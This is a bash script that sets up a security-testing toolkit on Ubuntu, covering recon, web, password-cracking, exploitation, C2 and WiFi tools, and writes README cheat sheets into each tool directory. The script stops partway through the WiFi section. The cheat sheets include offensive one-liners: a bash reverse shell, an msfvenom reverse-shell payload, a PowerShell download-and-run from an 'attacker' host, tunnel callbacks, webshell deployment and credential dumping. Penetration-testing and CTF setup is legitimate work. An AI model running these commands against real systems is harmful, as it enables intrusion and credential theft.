#!/bin/bash
# =============================================================================
#  Ubuntu 24.04 Comprehensive Security Tools Setup Script
#  Version 4.0 - Full CTF / Red Team / Blue Team / RF / CAN / Hardware / RE
#
#  Features:
#   - All installs fault-tolerant (no set -e, every failure is logged not fatal)
#   - Writes a README.md into EVERY tool directory explaining tools & usage
#   - Creates per-category directory trees
#   - Writes launcher scripts to /usr/local/bin for every major tool
#   - Tracks installed/skipped/failed counts for final summary
#
#  Usage: chmod +x setup.sh && ./setup.sh 2>&1 | tee install.log
#  Run as a NORMAL USER with sudo — NOT as root
# =============================================================================

# ── Colors & Helpers ──────────────────────────────────────────────────────────
RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; CYAN='\033[0;36m'; MAGENTA='\033[0;35m'
BOLD='\033[1m'; NC='\033[0m'

print_header() {
    echo ""
    echo -e "${BOLD}${BLUE}╔══════════════════════════════════════════════════════╗${NC}"
    echo -e "${BOLD}${BLUE}║  $1${NC}"
    echo -e "${BOLD}${BLUE}╚══════════════════════════════════════════════════════╝${NC}"
    echo ""
}
print_section() { echo ""; echo -e "${BOLD}${CYAN}━━━ $1 ━━━${NC}"; }
print_status()  { echo -e "${GREEN}[+]${NC} $1"; }
print_warning() { echo -e "${YELLOW}[!]${NC} $1"; }
print_error()   { echo -e "${RED}[-]${NC} $1"; }
print_info()    { echo -e "${MAGENTA}[*]${NC} $1"; }
command_exists(){ command -v "$1" >/dev/null 2>&1; }

INSTALLED=0; SKIPPED=0; FAILED=0

# Safe apt install — never exits on failure
safe_apt_install() {
    local pkg="$1"
    if apt-cache show "$pkg" >/dev/null 2>&1; then
        if sudo DEBIAN_FRONTEND=noninteractive apt install -y "$pkg" >/dev/null 2>&1; then
            print_status "$pkg installed"; ((INSTALLED++))
        else
            print_warning "$pkg: found in apt but install failed"; ((FAILED++))
        fi
    else
        print_warning "$pkg: not in apt repos - skipping"; ((SKIPPED++))
    fi
}

# Install a .deb from GitHub latest release
github_deb_install() {
    local repo="$1" pattern="$2" name="$3"
    print_info "Fetching latest $name from GitHub..."
    local url
    url=$(curl -sf "https://api.github.com/repos/${repo}/releases/latest" \
        | grep -Po '"browser_download_url":\s*"\K[^"]+' \
        | grep -E "$pattern" | head -1)
    if [ -n "$url" ]; then
        local tmp; tmp=$(mktemp /tmp/gh-deb-XXXXXX.deb)
        if wget -qO "$tmp" "$url"; then
            sudo DEBIAN_FRONTEND=noninteractive apt install -y "$tmp" \
                && { print_status "$name installed"; ((INSTALLED++)); } \
                || { print_warning "$name deb install failed"; ((FAILED++)); }
        else
            print_warning "$name download failed"; ((FAILED++))
        fi
        rm -f "$tmp"
    else
        print_warning "$name: no matching .deb in latest release"; ((SKIPPED++))
    fi
}

# Clone git repo if not already present
git_clone_tool() {
    local url="$1" dest="$2" name="$3"
    if [ ! -d "$dest" ]; then
        print_info "Cloning $name..."
        sudo git clone --depth=1 "$url" "$dest" \
            && { print_status "$name cloned"; ((INSTALLED++)); } \
            || { print_warning "$name clone failed"; ((FAILED++)); }
    else
        print_status "$name already present"
    fi
}

pip_install() {
    python3 -m pip install "$1" --break-system-packages --quiet \
        && { print_status "$1 (pip) installed"; ((INSTALLED++)); } \
        || { print_warning "$1 pip install failed"; ((FAILED++)); }
}

go_install() {
    go install -v "$1" 2>/dev/null \
        && { print_status "${1##*/} (go) installed"; ((INSTALLED++)); } \
        || { print_warning "go install $1 failed"; ((FAILED++)); }
}

gem_install() {
    sudo gem install "$1" --quiet \
        && { print_status "$1 (gem) installed"; ((INSTALLED++)); } \
        || { print_warning "$1 gem install failed"; ((FAILED++)); }
}

# Write a README.md into a directory (sudo)
write_readme() {
    local dir="$1"; shift
    sudo tee "$dir/README.md" >/dev/null << EOF
$@
EOF
}

# =============================================================================
# PRE-FLIGHT
# =============================================================================
print_header "Ubuntu 24.04 Comprehensive Security Tools Setup v4.0"

if [ "$EUID" -eq 0 ]; then
    print_error "Do NOT run as root. Run as a normal user with sudo privileges."
    exit 1
fi

if ! grep -q "24.04" /etc/os-release 2>/dev/null; then
    print_warning "This script targets Ubuntu 24.04 — other versions may have issues."
fi

print_info "Estimated time: 45–90 minutes depending on internet speed."
print_info "All failures are non-fatal. Check the summary at the end."

# =============================================================================
# DIRECTORY STRUCTURE
# =============================================================================
print_section "Creating Directory Structure"
BASE="/opt/security-tools"

for d in \
    "$BASE/network-recon" \
    "$BASE/web-testing" \
    "$BASE/password-cracking/wordlists" \
    "$BASE/password-cracking/hashfiles" \
    "$BASE/wifi-hacking/captures" \
    "$BASE/wifi-hacking/handshakes" \
    "$BASE/wifi-hacking/scripts" \
    "$BASE/binary-analysis/samples" \
    "$BASE/binary-analysis/scripts" \
    "$BASE/binary-analysis/reports" \
    "$BASE/binary-analysis/android" \
    "$BASE/binary-analysis/cyberchef" \
    "$BASE/reverse-engineering/samples" \
    "$BASE/reverse-engineering/scripts" \
    "$BASE/hardware-embedded/firmware" \
    "$BASE/hardware-embedded/can-logs" \
    "$BASE/hardware-embedded/serial-logs" \
    "$BASE/hardware-embedded/jtag-swd" \
    "$BASE/hardware-embedded/sdr-captures" \
    "$BASE/rf-sdr/captures" \
    "$BASE/rf-sdr/recordings" \
    "$BASE/canbus/captures" \
    "$BASE/canbus/scripts" \
    "$BASE/post-exploitation/windows" \
    "$BASE/post-exploitation/linux" \
    "$BASE/c2-frameworks" \
    "$BASE/digital-forensics/cases" \
    "$BASE/digital-forensics/memory" \
    "$BASE/mitm-interception/frida" \
    "$BASE/mitm-interception/captures" \
    "$BASE/mitm-interception/certificates" \
    "$BASE/mitm-interception/scripts" \
    "$BASE/blue-team/logs" \
    "$BASE/blue-team/rules" \
    "$BASE/blue-team/alerts" \
    "$BASE/detection-analysis/yara-rules" \
    "$BASE/detection-analysis/sigma-rules" \
    "$BASE/detection-analysis/scan-results" \
    "$BASE/detection-analysis/snort-logs" \
    "$BASE/detection-analysis/quarantine" \
    "$BASE/ctf/crypto" \
    "$BASE/ctf/pwn" \
    "$BASE/ctf/web" \
    "$BASE/ctf/forensics" \
    "$BASE/ctf/stego" \
    "$BASE/ctf/misc" \
    "$BASE/wordlists" \
    "$BASE/exploits" \
    "$BASE/development" \
    "$BASE/documentation"; do
    sudo mkdir -p "$d"
done
sudo chmod -R 755 "$BASE"
print_status "Directory structure created under $BASE"

# =============================================================================
# SYSTEM UPDATE & CORE DEPS
# =============================================================================
print_section "System Update"
sudo apt update && sudo apt upgrade -y

print_section "Core Dependencies & Build Tools"
sudo DEBIAN_FRONTEND=noninteractive apt install -y \
    python3 python3-pip python3-dev python3-venv python3-setuptools python3-wheel \
    python3-scapy python3-impacket \
    default-jre default-jdk openjdk-17-jdk openjdk-21-jdk \
    curl wget git vim htop tree unzip zip p7zip-full \
    build-essential cmake make gcc g++ clang llvm \
    libssl-dev libffi-dev libpcap-dev libusb-1.0-0-dev \
    libglib2.0-dev libgtk-3-dev \
    apt-transport-https ca-certificates gnupg lsb-release \
    software-properties-common \
    ruby ruby-dev bundler \
    golang-go nodejs npm perl \
    rustc cargo \
    screen minicom putty ghex \
    tmux gedit xterm \
    net-tools netcat-traditional ncat socat \
    tcpdump wireshark tshark \
    traceroute whois dnsutils \
    strace ltrace gdb gdb-multiarch \
    binutils file xxd \
    fuse3 libfuse3-dev \
    sqlite3 libsqlite3-dev \
    jq parallel pv sshpass \
    dos2unix expect \
    2>/dev/null || print_warning "Some core deps failed - continuing"

# Java 21 as default
if [ -d "/usr/lib/jvm/java-21-openjdk-amd64" ]; then
    sudo update-alternatives --install /usr/bin/java  java  /usr/lib/jvm/java-21-openjdk-amd64/bin/java  2100 2>/dev/null
    sudo update-alternatives --install /usr/bin/javac javac /usr/lib/jvm/java-21-openjdk-amd64/bin/javac 2100 2>/dev/null
    sudo update-alternatives --set java  /usr/lib/jvm/java-21-openjdk-amd64/bin/java  2>/dev/null
    sudo update-alternatives --set javac /usr/lib/jvm/java-21-openjdk-amd64/bin/javac 2>/dev/null
    print_status "Java 21 set as default"
fi

# Go PATH
export GOPATH="$HOME/go"
export PATH="$PATH:$GOPATH/bin:/usr/local/go/bin"
grep -q 'go/bin' "$HOME/.bashrc" 2>/dev/null || \
    echo 'export PATH=$PATH:$HOME/go/bin:/usr/local/go/bin' >> "$HOME/.bashrc"

# Snap
if ! command_exists snap; then
    sudo apt install -y snapd
    sudo systemctl enable --now snapd.socket
    sleep 5
fi

# =============================================================================
# VS CODE
# =============================================================================
print_section "Visual Studio Code"
if ! command_exists code; then
    wget -qO- https://packages.microsoft.com/keys/microsoft.asc \
        | gpg --dearmor | sudo tee /etc/apt/keyrings/microsoft.gpg >/dev/null 2>&1
    echo "deb [arch=amd64 signed-by=/etc/apt/keyrings/microsoft.gpg] https://packages.microsoft.com/repos/code stable main" \
        | sudo tee /etc/apt/sources.list.d/vscode.list >/dev/null
    sudo apt update -qq
    sudo apt install -y code 2>/dev/null \
        || sudo snap install --classic code 2>/dev/null \
        || print_warning "VS Code failed - https://code.visualstudio.com/"
fi

# =============================================================================
# WINE
# =============================================================================
print_section "Wine (Windows binary support)"
if ! command_exists wine; then
    sudo dpkg --add-architecture i386
    sudo mkdir -pm755 /etc/apt/keyrings
    if wget -qO /etc/apt/keyrings/winehq-archive.key \
            https://dl.winehq.org/wine-builds/winehq.key 2>/dev/null; then
        echo "deb [arch=amd64,i386 signed-by=/etc/apt/keyrings/winehq-archive.key] https://dl.winehq.org/wine-builds/ubuntu/ noble main" \
            | sudo tee /etc/apt/sources.list.d/winehq.list >/dev/null
        sudo apt update -qq
        sudo DEBIAN_FRONTEND=noninteractive apt install -y --install-recommends winehq-stable 2>/dev/null \
            || sudo apt install -y wine 2>/dev/null \
            || print_warning "Wine install failed"
    else
        sudo apt install -y wine 2>/dev/null || print_warning "Wine install failed"
    fi
fi

# =============================================================================
# TMUX CONFIG
# =============================================================================
print_section "tmux Configuration"
cat > "$HOME/.tmux.conf" << 'TMUX_CONFIG'
# Mouse support
set -g mouse on
set -g default-terminal "screen-256color"
set -g base-index 1
set -g pane-base-index 1
set -g renumber-windows on
set -g history-limit 50000
setw -g mode-keys vi

# Status bar
set -g status-position bottom
set -g status-bg colour234
set -g status-fg colour137
set -g status-left ''
set -g status-right '#[fg=colour233,bg=colour241,bold] %d/%m #[fg=colour233,bg=colour245,bold] %H:%M:%S '
set -g status-right-length 50
set -g status-left-length 20
setw -g window-status-current-format ' #I#[fg=colour250]:#[fg=colour255]#W#[fg=colour50]#F '
setw -g window-status-format ' #I#[fg=colour237]:#[fg=colour250]#W#[fg=colour244]#F '
set -g pane-border-style fg=colour238
set -g pane-active-border-style fg=colour51
set -g message-style fg=colour232,bg=colour166

# Splits - intuitive keys
bind | split-window -h -c "#{pane_current_path}"
bind - split-window -v -c "#{pane_current_path}"

# Navigation - no prefix needed
bind -n M-Left  select-pane -L
bind -n M-Right select-pane -R
bind -n M-Up    select-pane -U
bind -n M-Down  select-pane -D
bind -n S-Left  previous-window
bind -n S-Right next-window
bind r source-file ~/.tmux.conf \; display-message "Config reloaded!"

# Activity monitoring
setw -g monitor-activity on
set -g visual-activity on
set -g detach-on-destroy off
TMUX_CONFIG
print_status "tmux configured"
print_status "  ✓ Mouse mode | 256 color | 50k scrollback | vim keys"
print_status "  ✓ Alt+arrows: pane nav | Shift+arrows: window switch"
print_status "  ✓ prefix+| : split H | prefix+- : split V | prefix+r: reload"

# =============================================================================
# SECTION 1: NETWORK RECONNAISSANCE
# =============================================================================
print_header "Network Reconnaissance"
NETRECON_DIR="$BASE/network-recon"

for pkg in \
    nmap masscan netdiscover arp-scan \
    nikto dirb dirbuster gobuster \
    dnsrecon dnsenum dnsmap dmitry \
    fping hping3 netmask \
    enum4linux onesixtyone nbtscan \
    smtp-user-enum snmpcheck \
    theharvester smbmap smbclient \
    whois traceroute fierce amass \
    sslyze sslscan wafw00f whatweb \
    eyewitness p0f netsniff-ng ike-scan; do
    safe_apt_install "$pkg"
done

# SpiderFoot
SPIDERFOOT_DIR="$NETRECON_DIR/spiderfoot"
if [ ! -d "$SPIDERFOOT_DIR" ]; then
    git_clone_tool "https://github.com/smicallef/spiderfoot.git" "$SPIDERFOOT_DIR" "SpiderFoot"
    sudo pip3 install -r "$SPIDERFOOT_DIR/requirements.txt" --break-system-packages --quiet 2>/dev/null || true
    sudo tee /usr/local/bin/spiderfoot >/dev/null << 'EOF'
#!/bin/bash
cd /opt/security-tools/network-recon/spiderfoot && python3 sf.py "$@"
EOF
    sudo tee /usr/local/bin/spiderfoot-web >/dev/null << 'EOF'
#!/bin/bash
cd /opt/security-tools/network-recon/spiderfoot
echo "SpiderFoot Web UI: http://127.0.0.1:5001  (Ctrl+C to stop)"
python3 sf.py -l 127.0.0.1:5001
EOF
    sudo chmod +x /usr/local/bin/spiderfoot /usr/local/bin/spiderfoot-web
fi

# recon-ng
RECONNG_DIR="$NETRECON_DIR/recon-ng"
if [ ! -d "$RECONNG_DIR" ]; then
    git_clone_tool "https://github.com/lanmaster53/recon-ng.git" "$RECONNG_DIR" "recon-ng"
    sudo pip3 install -r "$RECONNG_DIR/REQUIREMENTS" \
        --break-system-packages --ignore-installed blinker --quiet 2>/dev/null || true
    sudo tee /usr/local/bin/recon-ng >/dev/null << 'EOF'
#!/bin/bash
cd /opt/security-tools/network-recon/recon-ng && python3 recon-ng "$@"
EOF
    sudo chmod +x /usr/local/bin/recon-ng
fi

# Go-based recon tools
if command_exists go; then
    for t in \
        "github.com/owasp-amass/amass/v4/cmd/amass@latest" \
        "github.com/ffuf/ffuf/v2@latest" \
        "github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest" \
        "github.com/projectdiscovery/httpx/cmd/httpx@latest" \
        "github.com/projectdiscovery/naabu/v2/cmd/naabu@latest" \
        "github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest" \
        "github.com/projectdiscovery/dnsx/cmd/dnsx@latest" \
        "github.com/hakluke/hakrawler@latest" \
        "github.com/tomnomnom/assetfinder@latest" \
        "github.com/tomnomnom/httprobe@latest" \
        "github.com/tomnomnom/waybackurls@latest" \
        "github.com/lc/gau/v2/cmd/gau@latest" \
        "github.com/OJ/gobuster/v3@latest" \
        "github.com/sensepost/gowitness@latest"; do
        go_install "$t"
    done
fi

sudo tee "$NETRECON_DIR/README.md" >/dev/null << 'NETREADME'
# Network Reconnaissance Tools

## Installed via APT
- nmap: Network exploration and security auditing
- masscan: Mass IP port scanner
- netdiscover: ARP network discovery
- arp-scan: LAN ARP scanner
- nikto: Web server vulnerability scanner
- dirb / dirbuster / gobuster: Directory brute forcing
- dnsrecon / dnsenum / dnsmap: DNS enumeration
- dmitry: Deep information gathering
- fping / hping3: Host ping/probing
- enum4linux: SMB/LDAP enumeration (Windows targets)
- theharvester: Email, subdomain, host OSINT
- smbmap / smbclient: SMB share enumeration
- fierce / amass: DNS recon and subdomain discovery
- wafw00f: Web Application Firewall detection
- whatweb: Web technology fingerprinting
- sslyze / sslscan: SSL/TLS auditing

## Installed via Git
- spiderfoot: OSINT automation platform (spiderfoot-web → http://127.0.0.1:5001)
- recon-ng: Web reconnaissance framework

## Installed via Go ($HOME/go/bin/)
- subfinder, httpx, naabu, nuclei, dnsx: ProjectDiscovery suite
- ffuf: Fast web fuzzer
- amass: Attack surface mapping
- assetfinder, httprobe, waybackurls: tomnomnom toolkit
- gobuster: Dir/DNS/vhost brute forcer
- gowitness: Web screenshot tool

## Usage Examples
```bash
# Network scan
nmap -sS -sV -A -T4 target.com
nmap 192.168.1.0/24 -sn          # Ping sweep

# Mass scanning
masscan -p1-65535 target --rate=10000

# DNS recon
subfinder -d target.com | httpx
dnsrecon -d target.com -t std
dnsenum target.com

# Web fuzzing
ffuf -w /opt/security-tools/wordlists/SecLists/Discovery/Web-Content/common.txt \
     -u http://target/FUZZ
gobuster dir -u http://target -w wordlist.txt

# Vulnerability scanning
nuclei -u http://target -t $HOME/nuclei-templates/

# SMB enumeration
enum4linux -a target
smbmap -H target

# OSINT
theHarvester -d target.com -b all
spiderfoot-web   # then open http://127.0.0.1:5001
recon-ng         # interactive framework
```

## Directories
- Scan results: /opt/security-tools/network-recon/
NETREADME
print_status "Network recon README written"

# =============================================================================
# SECTION 2: WEB APPLICATION SECURITY
# =============================================================================
print_header "Web Application Security"
WEB_DIR="$BASE/web-testing"

for pkg in sqlmap sqlitebrowser nikto cadaver zaproxy chromium; do
    safe_apt_install "$pkg"
done

gem_install "wpscan"

for p in dirsearch arjun wafw00f commix sstimap photon; do
    pip_install "$p"
done

if command_exists go; then
    go_install "github.com/jaeles-project/gospider@latest"
    go_install "github.com/hahwul/dalfox/v2@latest"
fi

github_deb_install "epi052/feroxbuster" "feroxbuster.*amd64.*\.deb$|feroxbuster.*x86_64.*\.deb$" "feroxbuster"

sudo tee "$WEB_DIR/README.md" >/dev/null << 'WEBREADME'
# Web Application Security Tools

## Installed via APT
- sqlmap: Automatic SQL injection and database takeover
- sqlitebrowser: GUI browser for SQLite databases
- nikto: Web server vulnerability scanner
- zaproxy: OWASP ZAP web security testing

## Installed via Gem
- wpscan: WordPress security scanner

## Installed via pip
- dirsearch: Web path scanner
- arjun: HTTP parameter discovery
- wafw00f: WAF detection
- commix: Command injection exploiter
- sstimap: Server-side template injection
- photon: Fast web crawler for OSINT

## Installed via Go
- gospider: Fast web spider
- dalfox: XSS scanning

## Installed via GitHub
- feroxbuster: Fast recursive content discovery

## Manual Installation Needed
- Burp Suite: https://portswigger.net/burp/communitydownload
  - Configure browser proxy: 127.0.0.1:8080
  - Import cert: http://burp/cert
- HttpToolkit: https://httptoolkit.tech/

## Usage Examples
```bash
# SQL injection
sqlmap -u "http://target.com/page.php?id=1" --dbs
sqlmap -u "http://target.com/page.php?id=1" -D dbname --tables
sqlmap -u "http://target.com/page.php?id=1" --dump
sqlmap -u "http://target.com/login" --data="user=admin&pass=test"

# Directory enumeration
ffuf -w wordlist.txt -u http://target/FUZZ
feroxbuster -u http://target -w wordlist.txt
gobuster dir -u http://target -w wordlist.txt

# WordPress
wpscan --url http://target --enumerate u,p,t

# XSS scanning
dalfox url http://target/?param=test

# Web crawling
gospider -s http://target -d 3

# Parameter discovery
arjun -u http://target/endpoint

# WAF detection
wafw00f http://target
```

## ffuf Reference (from CTF notes)
https://medium.com/quiknapp/fuzz-faster-with-ffuf-c18c031fc480
```bash
ffuf -w wordlist.txt -u http://t/FUZZ              # Directory
ffuf -w wordlist.txt -u http://t/?param=FUZZ       # Parameter
ffuf -w users.txt:U -w passwords.txt:P \
     -u http://t/ -d "u=U&p=P" -fc 401             # Cluster bomb
```

## Useful Links
- https://cantreally.cyou/ (CTF writeups)
- https://gchq.github.io/CyberChef/
- https://www.dcode.fr/
WEBREADME
print_status "Web testing README written"

# =============================================================================
# SECTION 3: PASSWORD CRACKING & WORDLISTS
# =============================================================================
print_header "Password Cracking & Wordlists"
PASS_DIR="$BASE/password-cracking"

for pkg in hashcat hydra john crunch cewl medusa ncrack \
           ophcrack fcrackzip pdfcrack rarcrack samdump2 chntpw; do
    safe_apt_install "$pkg"
done

# Pipal (Ruby)
PIPAL_DIR="$PASS_DIR/pipal"
if [ ! -d "$PIPAL_DIR" ]; then
    git_clone_tool "https://github.com/digininja/pipal.git" "$PIPAL_DIR" "pipal"
    cd "$PIPAL_DIR" && command_exists bundle && sudo bundle install --quiet 2>/dev/null || true
    sudo tee /usr/local/bin/pipal >/dev/null << 'EOF'
#!/bin/bash
cd /opt/security-tools/password-cracking/pipal && ruby pipal.rb "$@"
EOF
    sudo chmod +x /usr/local/bin/pipal
fi

# SecLists
SECLISTS_DIR="$BASE/wordlists/SecLists"
[ ! -d "$SECLISTS_DIR" ] && \
    git_clone_tool "https://github.com/danielmiessler/SecLists.git" "$SECLISTS_DIR" "SecLists"

# rockyou
if [ ! -f "$BASE/wordlists/rockyou.txt" ]; then
    safe_apt_install wordlists
    [ -f /usr/share/wordlists/rockyou.txt.gz ] && \
        sudo cp /usr/share/wordlists/rockyou.txt.gz "$BASE/wordlists/" && \
        sudo gunzip "$BASE/wordlists/rockyou.txt.gz" 2>/dev/null || true
fi

pip_install "name-that-hash"
pip_install "hashid"

sudo tee "$PASS_DIR/README.md" >/dev/null << 'PASSREADME'
# Password Cracking & Hash Analysis Tools

## Installed via APT
- hashcat: GPU-accelerated password recovery
- john: John the Ripper CPU cracker + 100+ format converters
- hydra: Network login brute forcer (SSH, FTP, HTTP, RDP...)
- medusa: Parallel network login cracker
- crunch: Custom wordlist generator
- cewl: Website wordlist generator
- ncrack: High-speed network authentication cracker
- ophcrack: LM/NTLM hash cracker with rainbow tables
- fcrackzip / pdfcrack / rarcrack: Archive crackers
- samdump2: Windows SAM database dumper
- chntpw: Offline Windows password editor

## Installed via Git + Ruby
- pipal: Password pattern analysis and statistics

## Wordlists
- SecLists: /opt/security-tools/wordlists/SecLists/ (~1GB)
- rockyou.txt: /opt/security-tools/wordlists/rockyou.txt
- System wordlists: /usr/share/wordlists/

## Usage Examples
```bash
# Identify hash type
name-that-hash --text 'hash_here'
hashid 'hash_here'

# hashcat
hashcat -m 0    -a 0 hashes.txt wordlist.txt   # MD5 dictionary
hashcat -m 100  -a 0 hashes.txt wordlist.txt   # SHA1
hashcat -m 1000 -a 0 hashes.txt wordlist.txt   # NTLM
hashcat -m 1800 -a 0 hashes.txt wordlist.txt   # sha512crypt (Linux)
hashcat -m 2500 -a 0 cap.hccapx  wordlist.txt  # WPA handshake
hashcat -m 0    --show hashes.txt               # Show cracked

# John
john --wordlist=rockyou.txt hashes.txt
john --show hashes.txt
ssh2john id_rsa > id_rsa.hash && john id_rsa.hash

# Hydra network brute force
hydra -l admin -P rockyou.txt ssh://target
hydra -L users.txt -P passwords.txt target ftp
hydra -l admin -P passwords.txt target.com \
      http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"

# Wordlist generation
crunch 8 8 -t @@@@@@%% > custom_wordlist.txt
cewl http://target.com -d 2 -m 5 > site_words.txt

# Password analysis
pipal rockyou.txt
pipal --output=analysis.txt dump.txt
```

## Directories
- Custom wordlists: /opt/security-tools/password-cracking/wordlists/
- Hash files: /opt/security-tools/password-cracking/hashfiles/
- pipal tool: /opt/security-tools/password-cracking/pipal/
PASSREADME
print_status "Password cracking README written"

# =============================================================================
# SECTION 4: EXPLOITATION & METASPLOIT
# =============================================================================
print_header "Exploitation Frameworks"
EXPLOIT_DIR="$BASE/exploits"

# Metasploit
if ! command_exists msfconsole; then
    print_info "Installing Metasploit Framework..."
    TMP_MSF=$(mktemp /tmp/msfinstall-XXXXXX)
    if curl -fsSL \
        "https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb" \
        -o "$TMP_MSF" 2>/dev/null; then
        chmod +x "$TMP_MSF"
        "$TMP_MSF" && rm -f "$TMP_MSF" \
            || { print_warning "Metasploit installer had errors"; rm -f "$TMP_MSF"; }
    else
        print_warning "Could not download Metasploit installer"
        rm -f "$TMP_MSF"
    fi
fi

safe_apt_install exploitdb
git_clone_tool "https://github.com/offensive-security/exploitdb.git" \
    "$EXPLOIT_DIR/exploitdb" "exploitdb"

pip_install "pwntools"
pip_install "ropper"
pip_install "impacket"
pip_install "crackmapexec"
pip_install "bloodhound"
safe_apt_install netexec
safe_apt_install impacket-scripts

# GEF for GDB
if command_exists gdb && [ ! -f "$HOME/.gdbinit" ]; then
    wget -qO "$HOME/.gdbinit-gef.py" "https://gef.blah.cat/py" 2>/dev/null \
        && echo "source ~/.gdbinit-gef.py" >> "$HOME/.gdbinit" \
        && print_status "GEF for GDB installed" \
        || print_warning "GEF install failed"
fi

# Responder
RESPONDER_DIR="$BASE/post-exploitation/Responder"
if [ ! -d "$RESPONDER_DIR" ]; then
    git_clone_tool "https://github.com/lgandx/Responder.git" "$RESPONDER_DIR" "Responder"
    sudo tee /usr/local/bin/responder >/dev/null << 'EOF'
#!/bin/bash
cd /opt/security-tools/post-exploitation/Responder && python3 Responder.py "$@"
EOF
    sudo chmod +x /usr/local/bin/responder
fi
safe_apt_install responder

# Tunneling
if command_exists go; then
    go_install "github.com/nicocha30/ligolo-ng/cmd/proxy@latest"
    go_install "github.com/nicocha30/ligolo-ng/cmd/agent@latest"
    go_install "github.com/jpillora/chisel@latest"
fi

sudo tee "$EXPLOIT_DIR/README.md" >/dev/null << 'EXPLOITREADME'
# Exploitation Tools

## Metasploit Framework
```bash
msfconsole                              # Launch console
msfvenom -p linux/x64/shell_reverse_tcp \
         LHOST=10.0.0.1 LPORT=4444 -f elf > shell.elf
msfdb init                              # Initialize database
msfupdate                               # Update framework
```

## SearchSploit / ExploitDB
```bash
searchsploit apache 2.4                 # Search by software/version
searchsploit -m 12345                   # Copy exploit to current dir
searchsploit -x 12345                   # Examine exploit
```

## Impacket (Windows/AD attacks)
```bash
impacket-psexec domain/user:pass@target
impacket-secretsdump domain/user:pass@target
impacket-GetNPUsers domain/ -usersfile users.txt -no-pass
impacket-GetUserSPNs domain/user:pass -request
impacket-ntlmrelayx -tf targets.txt -smb2support
```

## CrackMapExec / NetExec (AD Swiss Army Knife)
```bash
crackmapexec smb 192.168.1.0/24        # SMB host discovery
crackmapexec smb target -u user -p pass
crackmapexec smb target -u user -p pass --shares
crackmapexec smb target -u user -p pass --sam
```

## BloodHound (AD path finding)
```bash
bloodhound-python -d domain.local -u user -p pass -c All
# Then start BloodHound GUI and import JSON files
```

## Responder (credential capture)
```bash
responder -I eth0 -wF
responder -I eth0 -wFb    # Also capture basic auth
```

## Tunneling
```bash
# Chisel
chisel server --reverse --port 8080    # attacker
chisel client attacker:8080 R:socks    # victim

# Ligolo-ng
ligolo-proxy -selfcert                 # attacker
ligolo-agent -connect attacker:11601 -ignore-cert  # victim
```

## pwntools (CTF exploitation)
```python
from pwn import *
elf = ELF('./binary')
p = process('./binary')
p.sendline(cyclic(200))
offset = cyclic_find(p.corefile.fault_addr)
```
EXPLOITREADME
print_status "Exploitation README written"

# =============================================================================
# SECTION 5: POST-EXPLOITATION & C2
# =============================================================================
print_header "Post-Exploitation & C2 Frameworks"
POSTEX_DIR="$BASE/post-exploitation"

for pkg in weevely netcat-traditional proxychains4 sshuttle; do
    safe_apt_install "$pkg"
done
safe_apt_install powershell
gem_install "evil-winrm"
pip_install "updog"

# PEASS-ng
PEASS_DIR="$POSTEX_DIR/PEASS-ng"
if [ ! -d "$PEASS_DIR" ]; then
    git_clone_tool "https://github.com/carlospolop/PEASS-ng.git" "$PEASS_DIR" "PEASS-ng"
    sudo tee /usr/local/bin/linpeas >/dev/null << 'EOF'
#!/bin/bash
bash /opt/security-tools/post-exploitation/PEASS-ng/linPEAS/linpeas.sh "$@"
EOF
    sudo chmod +x /usr/local/bin/linpeas
fi

git_clone_tool "https://github.com/The-Z-Labs/linux-exploit-suggester.git" \
    "$POSTEX_DIR/linux-exploit-suggester" "linux-exploit-suggester"
git_clone_tool "https://github.com/PowerShellMafia/PowerSploit.git" \
    "$POSTEX_DIR/PowerSploit" "PowerSploit"

# Empire C2
EMPIRE_DIR="$BASE/c2-frameworks/empire"
[ ! -d "$EMPIRE_DIR" ] && \
    git_clone_tool "https://github.com/BC-SECURITY/Empire.git" "$EMPIRE_DIR" "PowerShell Empire"

# Sliver C2
if ! command_exists sliver-server; then
    TMP_S=$(mktemp /tmp/sliver-XXXXXX.sh)
    curl -fsSL "https://sliver.sh/install" -o "$TMP_S" 2>/dev/null \
        && chmod +x "$TMP_S" && sudo "$TMP_S" \
        && print_status "Sliver C2 installed" \
        || print_warning "Sliver install failed - https://github.com/BishopFox/sliver"
    rm -f "$TMP_S"
fi

sudo tee "$POSTEX_DIR/README.md" >/dev/null << 'POSTREADME'
# Post-Exploitation & C2 Frameworks

## Privilege Escalation
```bash
# Linux
linpeas                                         # Automated enum
bash /opt/security-tools/post-exploitation/PEASS-ng/linPEAS/linpeas.sh
/opt/security-tools/post-exploitation/linux-exploit-suggester/linux-exploit-suggester.sh

# Windows (run on target)
# powershell -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://attacker/winpeas.ps1')"
```

## Shells & Pivoting
```bash
# Reverse shells
nc -lvnp 4444                              # Listener
bash -c 'bash -i >& /dev/tcp/IP/4444 0>&1' # Bash reverse shell

# Pivoting
sshuttle -r user@pivot 10.0.0.0/24         # VPN over SSH
proxychains4 nmap target                    # Through SOCKS proxy
ssh -D 1080 user@pivot                      # SOCKS tunnel

# File serving
updog -p 80                                 # Quick HTTP server
python3 -m http.server 8080
```

## Windows
```bash
evil-winrm -i target -u user -p pass       # WinRM shell
evil-winrm -i target -u user -H NTHASH    # Pass the hash
pwsh                                        # PowerShell on Linux
# PowerSploit: /opt/security-tools/post-exploitation/PowerSploit/
```

## C2 Frameworks
```bash
# Sliver
sliver-server                               # Start server
sliver                                      # Connect client
# Inside sliver: generate --mtls --os linux --arch amd64

# Empire
cd /opt/security-tools/c2-frameworks/empire
sudo ./setup/install.sh                     # One-time setup
./empire                                    # Start
# starkiller for web UI
```

## Weevely (PHP webshell)
```bash
weevely generate mypassword /var/www/html/shell.php
weevely http://target/shell.php mypassword
```

## Directories
- Windows tools: /opt/security-tools/post-exploitation/windows/
- Linux tools:   /opt/security-tools/post-exploitation/linux/
- C2 frameworks: /opt/security-tools/c2-frameworks/
POSTREADME
print_status "Post-exploitation README written"

# =============================================================================
# SECTION 6: WIFI & WIRELESS
# =============================================================================
print_header "WiFi & Wireless Security"
WIFI_DIR="$BASE/wifi-hacking"

for pkg in aircrack-ng airgraph-ng pixiewps reaver bully wifite cowpatty \
           macchanger hostapd dnsmasq python3-scapy python3-pyqt5 \
           hcxtools hcxdumptool iw wireless-tools wpasupplicant; do
    safe_apt_install "$pkg"
done

